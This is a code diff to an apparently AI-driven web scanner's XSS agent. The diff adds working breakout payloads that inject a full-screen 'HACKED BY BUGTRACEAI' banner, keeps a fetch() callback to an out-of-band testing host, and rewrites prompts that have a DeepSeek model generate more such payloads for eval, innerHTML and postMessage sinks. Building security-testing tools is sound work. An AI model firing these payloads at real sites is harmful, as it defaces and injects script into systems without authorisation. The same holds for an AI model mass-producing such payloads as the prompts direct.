@@ -159,6 +159,9 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
         "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
         "\\';alert(document.domain)//",
+        # BACKSLASH-QUOTE BREAKOUT WITH BACKTICKS (ginandjuice.shop killer)
+        # For JS contexts where quotes are escaped but backticks are not
+        "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
         "<details open ontoggle=fetch('https://{{interactsh_url}}')>"
     ]
     
@@ -881,16 +884,34 @@ class XSSAgent(BaseAgent, TechContextMixin):
             "INFO"
         )
 
-        # Ask DeepSeek for visual payloads
-        visual_payloads = await self._ask_deepseek_visual_payloads(
+        # FIRST: Add pre-built visual payloads from GOLDEN_PAYLOADS
+        # These are PROVEN working payloads with specific breakout techniques
+        prebuilt_visual = [
+            # Backslash-quote breakout with backticks (JS contexts with quote escaping)
+            "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
+            # Single quote breakout
+            "';var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//",
+            # Double quote breakout
+            "\";var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//",
+            # HTML attribute breakout
+            "\"><div style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\">HACKED BY BUGTRACEAI</div><input value=\"",
+            # SVG breakout
+            "\"><svg onload=\"var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)\">",
+        ]
+
+        # THEN: Ask DeepSeek for additional context-specific visual payloads
+        deepseek_payloads = await self._ask_deepseek_visual_payloads(
             param=param,
             contexts=list(contexts_found),
             sample_payloads=sample_payloads
         )
 
+        # Combine: prebuilt FIRST (proven), then DeepSeek (context-specific)
+        visual_payloads = prebuilt_visual + deepseek_payloads
+
         if visual_payloads:
             dashboard.log(
-                f"[{self.name}] 🎯 Generated {len(visual_payloads)} visual payloads with banner",
+                f"[{self.name}] 🎯 {len(prebuilt_visual)} prebuilt + {len(deepseek_payloads)} DeepSeek = {len(visual_payloads)} visual payloads",
                 "SUCCESS"
             )
 
@@ -927,7 +948,13 @@ Generate exactly 10 XSS payloads that will:
 1. Break out of the current context
 2. Inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"
 
-The banner MUST be visible on the page. Use this pattern:
+CRITICAL RULES FOR JAVASCRIPT CONTEXTS:
+- If context is javascript_string or script, quotes are often escaped (\\' or \\")
+- Use BACKTICKS (`) instead of quotes for all string literals inside the payload
+- Use \\'; or \\"; to break out of strings with backslash escaping
+- Example working payload: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//
+
+FOR HTML CONTEXTS, use this pattern:
 <div id="bt-pwn" style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>
 
 Return ONLY the payloads, one per line, no explanations, no numbering.
@@ -1890,13 +1917,19 @@ Generate exactly 10 XSS payloads that will:
 1. Exploit this specific sink ({sink}) via the source ({source})
 2. Create a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"
 
-The banner MUST be visible. Use this style:
-document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>'+document.body.innerHTML
+CRITICAL: Use BACKTICKS (`) instead of quotes for all strings to avoid escaping issues!
 
-Adapt the payload to work with the {sink} sink. For example:
-- For eval: use string that creates the div
-- For innerHTML: inject the div HTML directly
-- For postMessage: craft message that triggers the sink
+Working example for eval sink (uses backticks):
+var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);
+
+Working example for innerHTML sink:
+<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>
+
+Adapt the payload to work with the {sink} sink:
+- For eval/Function: use backticks for strings, create div via DOM API
+- For innerHTML/outerHTML: inject div HTML directly
+- For document.write: write the full div HTML
+- For postMessage: craft message payload with backticks
 
 Return ONLY the payloads, one per line, no explanations."""
 
